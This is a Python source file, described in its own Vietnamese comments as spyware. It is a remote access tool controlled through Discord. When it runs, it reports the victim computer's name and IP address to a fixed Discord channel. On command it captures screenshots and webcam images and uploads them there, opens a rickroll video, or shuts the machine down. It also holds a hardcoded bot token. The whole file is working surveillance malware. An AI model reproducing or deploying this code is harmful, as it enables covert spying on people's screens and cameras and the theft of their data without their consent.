#hey! Skidder, make sure to leave credits! made by Dong Kha

# VUI LÒNG ĐỌC NẾU BẠN ĐANG XEM SOURCE CODE
# Đây là một dạng phần mềm gián điệp được code bởi Nguyễn Đông Kha
# Nó được vận hành bởi dùng những thư viện bên dưới
# Có thể tắt nó bằng Task Manager tên task là Python(Background proccess)
# Để chạy nó cần chạy file Run.bat
# Chỉ hoạt động trên windows

import pyautogui
import os
import discord
import socket
import webbrowser as w
import cv2
from cv2 import *

#Take screenshot of target
def take_screenshot():
	myScreenshot = pyautogui.screenshot()
	myScreenshot.save(r'save.png')

client = discord.Client()

@client.event
async def on_ready():
	host_name = socket.gethostname()    
	ip = socket.gethostbyname(host_name)   

	channel = client.get_channel(951118245333721140) #Channel ID
	await channel.send('PC name '+"**"+str(os.getenv('COMPUTERNAME'))+"**"+"\n"+'Logged in '+"**"+str(ip)+"**")
	#await channel.send('Logged in '+"**"+str(ip)+"**")

@client.event
async def on_message(message):
	if message.author == client.user:
		return

	#screenshot commmand - give a screenshot image of target
	if message.content.startswith('$screenshot'):
		take_screenshot()
		await message.channel.send('PC name '+"**"+str(os.getenv('COMPUTERNAME'))+"**")
		await message.channel.send(file=discord.File('save.png'))
		os.remove('save.png')

	#rick roll command - Rick roll target
	if message.content.startswith('$rickroll'):
		w.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
		await message.channel.send('Rick roll sent!')

	#list command - list of targets
	if message.content.startswith('$list'):
		await message.channel.send('PC name '+"**"+str(os.getenv('COMPUTERNAME'))+"**")

	#snap command - snapp target's camera
	if message.content.startswith('$snap'):
		cam = cv2.VideoCapture(0)
		result, image = cam.read()
		cv2.imwrite('save.png', image)
		if result:
			await message.channel.send(file=discord.File('save.png'))
			await message.channel.send('`Snapped webcam`')
			os.remove('save.png')

	#shutdown command - shutdown target's computer
	if message.content.startswith('$shutdown'):
		os.system("shutdown -s")

	#help command
	if message.content.startswith("$help"):
		await message.channel.send("**$list** to list targets \n **$screenshot** to view target's screenshot \n **$rickroll** to rick roll target's computer \n **$shutdown** to shutdown target's computer \n **$snap** to snap target's webcam")
		#await message.channel.send("**$screenshot** to view target's screenshot")
		#await message.channel.send("**$cmd** to start cmd in target's computer")
		#await message.channel.send("**$rickroll** to rick roll target's computer")
		#await message.channel.send("**$shutdown** to shutdown target's computer")
		#await message.channel.send("**$snap** to snap target's webcam")

client.run('OTU0MDAxNDcyNTUzNjMxNzU1.YjMxGw.6AUaVX1L_I0qbnCLBwlTM3zYC1Q') #Paste bot token